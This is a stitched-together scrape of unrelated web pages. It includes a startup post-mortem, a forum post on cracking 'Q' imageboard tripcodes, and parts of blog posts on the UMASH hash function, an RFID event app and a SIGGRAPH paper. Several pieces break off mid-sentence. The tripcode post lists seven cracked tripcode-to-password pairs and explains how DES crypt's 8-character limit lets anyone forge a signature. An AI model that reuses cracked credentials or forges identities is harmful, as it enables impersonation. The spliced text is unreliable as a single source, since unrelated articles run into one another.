<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><article><p>10 months ago, I launched Prosper which started as an NPS software, but ended up becoming a marketing tool. I’m writing this to reflect on why I won't be working on Prosper anymore. What went wrong? What went good? And lastly, what I’m working on next. </p><h2>The Launch</h2><p>The idea behind Prosper was simple, video popups for capturing email address. I added video inside popups to make marketing more real by showing the real person behind the website. It was a completely an unexplored idea. I developed Prosper on weekends and after office hours as I had a full time job.</p><p>It took me a month or two to develop, and on Oct 15th, I launched Prosper on Product Hunt and Hacker News. At the time of launch, I kept the product free, so people could try it out without any friction. The launch went pretty good, and Prosper became #5 trending product of the day. </p><p>For launching on Product Hunt, you might have heard of tactics like, post on Tuesday, 00:00 pacific time. All these matters!. But, one thing that helped me was - the idea. It was the new which helped me a lot in catching eyeballs. People were automatically <a href="https://twitter.com/manikarthik/status/1184018595824619520">sharing and talking</a> about the product. </p><p>And, getting comments&nbsp;from <a href="https://twitter.com/rrhoover">Ryan Hoover</a> (founder of Product Hunt) and <a href="https://twitter.com/jijosunny">Jijo Sunny</a> (founder of Buymeacoffee) added more fuel to my motivation. Whatever users I have got, I can attribute it to Product Hunt only. </p><p data-url=""><img src="https://images.prismic.io/meetchopra/92586717-049b-4af5-ace9-0dc3a399af99_PH_Comments.png?auto=compress,format&amp;rect=0,0,879,208&amp;w=1200&amp;h=284"></p><p>At the same time, launching on Hacker News didn’t bring anything. People there didn’t like the product at all. Hacker News is a really unpredictable platform.&nbsp;</p><h2>Where things started falling</h2><p>After the launch, I started monitoring how the popups were performing. And, here’s where it all started going down.</p><p>According to SumoMe, the average performing popups resulted in 3.1% conversion rate. As I was introducing a new type of solution, it should be at least double the existing conversion rate, which should be around 6%.</p><p data-url=""><img src="https://images.prismic.io/meetchopra/c938d4d5-5c20-4ee5-a066-03dc895a55fe_conversion.png?auto=compress,format&amp;rect=0,0,586,367&amp;w=1200&amp;h=752"></p><p>For my product, 444 users signed up out of which only 5% (23) of the people gave it a try by installing on their website. Out of this thin slice of bread, the conversion rate was nothing. The conversion rate didn't even match for an average performing popups.</p><p data-url=""><img src="https://images.prismic.io/meetchopra/b7280505-7a10-410f-b48d-3bd09298cc4a_prosper_graph.png?auto=compress,format&amp;rect=0,0,1355,788&amp;w=1200&amp;h=698"></p><p>The product needed more experiments at a fast speed like building more types of popups, talking to customers, etc.</p><p>After getting such a good reaction to the idea, and the product not performing well. I was stuck. I didn’t know what to do. It was a pretty confusing state to be in. The product needed more work on a fundamental level. With more experiments at a fast speed, and talking to customers, I’m sure the product would have been in a better place.</p><p>But it struck me hard. I started losing motivation. I was not able to convince myself that my popup works better than the existing one. It was some kind of decision paralysis, where I didn’t know what to pick up next. As I was working solo, it became difficult for me to iterate fast on the product, respond to customers, and work on marketing it all by myself.</p><p>So, as an IndieHacker it turned out to be a pretty bad idea to start with an experimental idea. It was tough and the odds of success are always low if the whole idea is an experiment. It's better to build and serve a proven market that is big enough, as an IndieHacker. Starting with a new idea, that hasn’t been explored much, needs a lot of consistent work which becomes difficult for a single person. So, Prosper turned out to be a bad idea for me.</p><p>What Justin Jackson said in <a href="https://justinjackson.ca/good-idea-or-bad-idea">good idea or bad idea</a> fit’s here perfectly: </p><blockquote><div><p>Bad ideas are&nbsp;hungry: they consume whatever energy, money, or time you throw at them, without giving you anything back.
</p><p>
Good business ideas sweep you up with their momentum.</p></div><a href="#"><svg xmlns="http://www.w3.org/2000/svg" role="img" viewBox="0 0 24 24" data-src="/img/icons/social/twitter.svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Twitter icon</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"></path></svg><span>Tweet</span></a></blockquote><h2>Quick Learnings</h2><p>While working on Prosper, I learned a few small things. Here’s some of them:</p><ul><li>One thing that struck out was the importance of keeping in touch with your customers, especially in the early days. Be it on twitter, running an email series, or whatever. That’s where you can learn more about them and decide the direction of the product. Talking to customers on support is the best source where you can know them better. </li><li>Keeping your support channels limited. For Prosper, I added my email address, support email address, live chat, and&nbsp;even a phone number. Creating multiple channels to contact was a terrible move. I was not able to reply properly to any customer. I lost the chance to connect with the customers there. For my next products, I have shifted to live chat only. Much better. There's less friction on reaching over chat. </li></ul><p><em>One tip, don’t install drift. Installing drift was a pretty bad decision. You can’t even reply to a chat from email. And, the whole platform&nbsp;seems to be lost. I have started using <a href="https://crisp.chat/">crisp</a> for all my products. Much better. Tons of reliable features with great support.</em></p><ul><li>User onboarding, is very critical. Displaying the value early often and delivering the wow moment will make them come back to your software. Otherwise, people forget about your software after trying it out. If you look at Prosper’s metrics, 76% (341 people) did nothing after signing up. Clearly, I failed at&nbsp;showing the value upfront clearly in as few steps as possible. </li></ul><p data-url=""><img src="https://images.prismic.io/meetchopra/f46fcea2-e502-4f7a-97f0-7a418425bf2c_analytics_prosper.png?auto=compress,format&amp;rect=0,0,1366,820&amp;w=1200&amp;h=720"></p><h2>What’s next?</h2><p>I have 2 things on my plate.</p><p><a href="https://usespotlight.co/">Spotlight</a> and a new product I will be working on -&nbsp;<a href="https://waveapp.io/">Wave</a>.</p><p>I’m building a popup builder.

August 25, 2020 | https://poal.co/s/Whatever/96505 | <a href="https://web.archive.org/web/*/https://poal.co/s/Whatever/96505">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-f9b525e3-30b3-4d38-89c4-1733cfc7da6e">
                  <p>Q verifies his identity via a cryptographic signature, or "tripcodes."  These tripcode hashes (e.g. CbboFOtcZs ) are based on the DES/crypt(3) encryption algorithm.  DES (Digital Encryption Standard) was standardized in 1977 and has been largely deprecated due to widely-known weaknesses.  A good primer on these weaknesses from way back in 1997 can be found here: <a href="http://personal.stevens.edu/~khockenb/crypt3.html">http://personal.stevens.edu/~khockenb/crypt3.html</a> .   Tripcodes are created via the algorithm described here: <a href="http://www.thefullwiki.org/Tripcode">http://www.thefullwiki.org/Tripcode</a>.  I suspect that if such an operation were carried out, the coordinator would at least sign messages using an algorithm from the NSA Suite B, such as the Advanced Encryption Standard (AES) -- or even a PGP signature -- so that an opponent couldn't hijack his identity as easily as has been done here.  He may upgrade his standards after reading this, but frankly, it is a far too late to matter.</p>

<p>Using an open source password cracker (hashcat), publicly available information, and a little guess work about Q's favored key space, a user can successfully recover all of the passwords that correspond to Q tripcodes. These are posted below in chronological order of use:</p>

<p>Tripcode:  ITPb.qbhqo  -&gt;  Password:  Matlock
Tripcode:  UW.yye1fxo  -&gt;  Password:  M@tlock!
Tripcode:  xowAT4Z3VQ  -&gt;  Password:  Freed@m-
Tripcode:  2jsTvXXmXs  -&gt;  Password:  F!ghtF!g
Tripcode:  4pRcUA0lBE  -&gt;  Password:  NowC@mes
Tripcode:  CbboFOtcZs  -&gt;  Password:  StoRMkiL
Tripcode:  A6yxsPKia.  -&gt;  Password:  WeAReQ@Q</p>

<p>Note that Q seems to be unaware that the algorithm only takes the first 8 characters of the password and ignores the rest.  In the past, Q has claimed to have baked meaning and foreknowledge of future events into these passwords, in particular, the 4pRcUA0lBE:NowC@mes tripcode-password pair.  If I understand correctly, Q claims that the full password was "NowC@mesTHEP@in---23," with 23 signifying the date of an important event, but anything beginning with "NowC@mes" would yield the same tripcode signature.  This weakness severely undercuts any claimed predictive power and indicates a possible intent to mislead.  For example, all of the following passwords should yield the same tripcode, 4pRcUA0lBE:</p>

<p>NowC@mesTheKing      -- Q is Snoop Dogg
NowC@mesTheSun       -- Q is Ringo Starr
NowC@mesTheAnswer-42 -- Q is Douglas Adams</p>

<p>These can all be tested at at minichan's tripcode test page. <a href="https://minichan.org/triptest?name=A%23NowC%40mesTheAnswer-42">https://minichan.org/triptest?name=A%23NowC%40mesTheAnswer-42</a> .</p>

<p>To directly test all of these examples with a DES cypher, go to <a href="https://www.functions-online.com/crypt.html">https://www.functions-online.com/crypt.html</a> , paste the password in, and use the second and third characters of the password as the salt.  The tripcode will be the final ten characters of the resulting DES hash.  </p>

<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,
before <a href="#usage">describing a few interesting usage patterns.</a></p><p><small>The latency and throughput results above were all measured on
the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>

                          <p><em><span>Using the example of the <a href="https://www.purrweb.com/portfolio/wristband/">WRISTBAND event app</a>, I will tell you how to boost up the hard skills of developers and smoothly test new features right while developing a real project.</span></em></p>
<p>Developers, trying to make <del>life</del> the project process easy and improve their skills, bury themselves in useful tools: frameworks, libraries, manuals. In fact, the situation is as follows: unsolved tasks seem to never end, and the extension of the expertise becomes a daily routine. It’s unlikely that we can change it. And seeking to do it is hardly pragmatic</p>
<p>Let’s see what can be optimized!</p>
<h2>How not to drown in the information chaos</h2>
<p>Client feature request – can it be challenging? Of course! To deal with such, some employers prefer to take team training upon themselves: they buy up various courses and tickets to conferences and hackathons. Is it effective? Probably yes. Are there any other options? Our experience shows — yes.</p>
<p>To level up team skills (to handle tough feature request, you should be a pro), we chose a very rational approach: it’s up to a person what and where to learn, which means that the developers are responsible for their own skills. This saves a lot of time since developers learn skills that are required immediately and test them on real projects.</p>
<p>If the client feature request is about working with a technology we aren’t familiar with, we follow the pre-developed plot. I’ll explain it by using the example of a small passing application for the event industry that we’ve created.</p>
<p><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image6.gif" alt="" width="600" height="365"></p>
<h2>The client feature request is to create something we’ve never done before</h2>
<p>To get more details about this feature request, let us tell you a story. We received a trial task to develop a mobile application from startupers who lived in New Orlean and sold IT-solutions for event organizers. Ok. We’ve got a task. The task was to build a service for security guards which will reduce queues at the entrance and make it real for guests to pass through by using wristbands with RFID-tags.</p>

<p>Creating an interface for this mini-app — only three screens — dead easy for us. But its performance was to be provided by technologies we weren’t sure of. In particular, this applied to RFID tags. At the time, we didn’t work with them, and online research didn’t give a clear answer to our question if there are libraries that can read them.</p>
<p>Additional conditions set by the clients during the briefing made the overall situation even worse. Go ahead and find out what happened.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<h2>The first stage: complexity estimation</h2>
<p>One of the main project challenges — deadlines (tough feature request isn’t the only thing we should worry about). We had less than a month. Besides it, another factor impeding the situation was that the service was to be used from a rare smartphone model that could not be obtained.</p>
<p>One more thing: the application needed steady offline mode. At events (especially held in the open air), there are often problems with the internet connection but a bad signal should not slow down the work of the guards. The app was to be designed so it could work without connection but sync with the server as soon as the internet shows up. What if someone bought a ticket at the last moment or after the event starts?</p>
<p>Handling this feature request didn’t seem challenging, but everything had to be done flawlessly. As it’s supposed that letting through would take no more than 2 seconds, lags and slowdowns were not allowed.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<h2>The second stage: implementation and testing</h2>
<p>As we had less than a month, our strategy was like this: 2 days to test the most problematic features and if find a solution — keep working. The clients were pleased with it and we dug deep in the development stage.</p>
<p>First, we plumbed the depths of RFID tags. We chose several libraries that could help us manage this task. We then discovered that RFID tag — is a predecessor of NFC technology, hence theoretically any smartphone with an NFC module could ‘understand’ the information in the bracelet.</p>
<p>As a result, we created the technical prototype and tested the needed set of features (using our own smartphones and credit cards). The original hypothesis was confirmed, and the library didn’t fail. Since we didn’t have the opportunity to test this functionality on the right model, we sent a technical prototype to the clients. Everything worked as expected, and we promptly switched to other tasks that were not somehow difficult.</p>

<p>So what did we get? A very minimalistic design with traditional ‘traffic light’ colors: red — if the guest doesn’t have access to a zone, and yellow — if the check-in stage was passed earlier. Additionally, app work was accompanied by relevant audio signals which helped to reduce the time of passage of a person through the control point.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<h2>The third stage: consolidation of knowledge</h2>
<p>What can help you in mastering a new feature (and handling client feature request — particularly, the toughest ones) is telling your teammates about it. Unlike attending conferences, this practice is a mandatory and regular ritual that happens several times a month in our team. No preludes or formalities — a short speech of 30 minutes is enough.</p>
<p>As part of an in-company meetup, we discuss not only features but also the process of solving problems. Sometimes we end with a detailed guide — this works in cases when the team regularly uses a particular technology (for example, FaceID).</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<p>Initially, it seemed that programmers would be skeptical about such performances and the prospect of broadcasting ‘about something’ in public would strain them. In fact, it turned out differently: the opportunity to share experience was taken with sympathy. People were glad to get the chance to be an expert. Plus, such events added value to the work and greatly improved the team spirit.</p>
<h2>Conclusion</h2>
<p>The app and the wristband have successfully worked at several events, and the project is now actively developing. What about us: we have been working on the contactless payment feature and we’re almost in the home stretch, which means that the bracelet will contain not only information about access to specific zones but also turn into an e-wallet that can be used for transactions at the event.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<p>For example, you will be able to pay via it for a dish on the food court or in the shop zone. Thus, the app has become the basis for an infrastructure service that allows to collect detailed statistics about the event and purchases made during it. And we have got a promising client who likes to experiment with technology and is ready to entrust us with the most complex pieces.</p>

<h2>Or, "How I turned my side project into a paper at a top graphics conference"</h2>
<p>In my spare time between late 2019 and early 2020,
I wrote a <a href="https://www.mattkeeter.com/research/mpr">technical paper</a> which was accepted to
<a href="https://www.siggraph.org/">SIGGRAPH</a>.</p>
<p><a href="https://www.mattkeeter.com/research/mpr"><img src="https://www.mattkeeter.com/projects/siggraph/paper.png" alt="Paper"></a></p>
<p>SIGGRAPH is, by all accounts, the best research venue in computer graphics,
so I was aiming a bit high, but a man's gotta have hobbies.</p>
<p>This writeup is a behind-the-scenes look at the experience.
For example, you'll learn why 3/5 reviewers
recommended rejecting the paper,
and how I managed to change their minds in my rebuttal.</p>
<p>Hopefully, this will help folks considering a similar path;
this information is normally passed down through academic research groups,
so it's hard to know what to expect as an independent researcher.</p>
<h2>What's the paper about?</h2>
<p>(If you've read the paper, skip to the <a href="#timeline">timeline</a>)</p>
<p>You can <a href="https://www.mattkeeter.com/research/mpr/keeter_mpr20.pdf">read it</a> (PDF, 4.6 MB),
but I'll present a summary here.</p>
<p>The paper presents a new way to render closed-form <a href="https://en.wikipedia.org/wiki/Implicit_surface">implicit surfaces</a> on the GPU.</p>
<p>Our implicit surfaces are defined by a function \(f(x, y, z)\) which
can be evaluated at any point \((x, y, z)\) in space.
Where the function is <em>negative</em>, we're inside the shape;
where the function is <em>positive</em>, we're outside the shape.
The boundary of the shape is the <a href="https://en.wikipedia.org/wiki/Isosurface">isosurface</a>
\(f(x, y, z) = 0\).</p>
<p>"Closed-form" means the function is built from a bunch of math operations,
e.g.</p>
<p>$$\max\left(0.5 - \sqrt{x^2 + y^2}, \sqrt{x^2 + y^2} - 1\right) &lt; 0$$</p>
<p>(rather than a more powerful representation that supports looping or branching)</p>
<p>This is a simple and homogeneous representation, though it's very low-level.
Think of it as an assembly language for shapes:
painful to write manually,
but a reasonable target for higher-level tools.</p>
<p>We take this representation and convert it into a directed acyclic graph,
which deduplicates common subexpressions:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/annulus.png" alt="Annulus"></p>
<p>Then, we convert this graph to a <em>tape</em>,
which is straight-line code that's equivalent to the DAG.
In this step, we perform <a href="https://en.wikipedia.org/wiki/Register_allocation">register allocation</a>
when deciding where to store intermediate results.</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/tape.png" alt="Tape"></p>
<p>We upload the tape to the GPU,
where the interesting work happens!</p>
<p>We evaluate the tape using <a href="https://en.wikipedia.org/wiki/Interval_arithmetic">interval arithmetic</a>,
which lets us check whether a particular region is inside, outside,
or on the shape's boundary.
Since we're on the GPU, this evaluation is done for many regions in parallel.</p>
<p>For regions that are ambiguous,
we subdivide them and recurse.
While recursing,
we prune the tapes to only contain active clauses,
which lets us do much less work in evaluating.</p>
<p>This evaluation process subdivides down to individual pixels / voxels,
which are then evaluated directly.  In 3D, we also use
<a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation</a>
to estimate surface normals.</p>
<p>Here's what this looks like in 2D, rendering a quarter-circle:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/recursion.png" alt="Recursion"></p>
<p>At a high level, this is all very similar to
<a href="http://fab.cba.mit.edu/classes/S62.12/docs/Duff_interval_CSG.pdf">Interval Arithmetic and Recursive Subdivision for Implicit Functions and Constructive Solid Geometry (Duff '92)</a>.
The interesting part of my paper is in adapting this algorithm
(which is deeply recursive with heterogenous workflows in each branch)
to run well on GPUs,
plus a bunch of real-world implementation details and benchmarks.</p>
<p>The pipeline works in both 2D and 3D.  In 2D, it produces black-and-white images,
while in 3D, it produces heightmaps and normals:</p>

<p>The paper concludes with benchmarking results and directions for future research.</p>

<h2>Timeline (2019-2020)</h2>
<p>Writing this paper filled about six months of my nights-and-weekends spare time,
with a mix of development, writing, editing, and waiting.</p>
<h3>May (2019) and earlier</h3>
<p>Back in grad school,
I worked on software for computer-aided design using
<a href="https://en.wikipedia.org/wiki/Function_representation">functional representations</a>
as the underlying model representation.</p>
<p>After graduation,
this work continued as a long-running side project,
with a <a href="https://www.mattkeeter.com/projects/kokopelli">few</a> <a href="https://www.mattkeeter.com/projects/antimony/">design</a> <a href="https://libfive.com/studio/">tools</a>
and an <a href="https://libfive.com/">open-source kernel</a>
that's used in both open-source and commercial CAD packages.
I'd made various <a href="https://github.com/libfive/libfive/commit/50ca3fd8ddd3db401ade3d1f2924e6adb27bd630">attempts</a>
over the years to put rendering on the GPU,
but without any success until now.</p>
<p>The most recent, successful work was inspired by
<a href="https://raphlinus.github.io/rust/graphics/gpu/2019/05/08/modern-2d.html">this blog post</a>
in May 2019.
I read through the blog post,
then skimmed the cited research papers
and reference implementation,
and started pondering whether a similar strategy
could work for functional representations.</p>
<h3>October-December (2019): Implementation</h3>
<p>The first tangible hints of this project are an October 11th entry in my engineering notebook,
boldly titled "GPU-Accelerated F-Rep Rendering" (click for full resolution).</p>
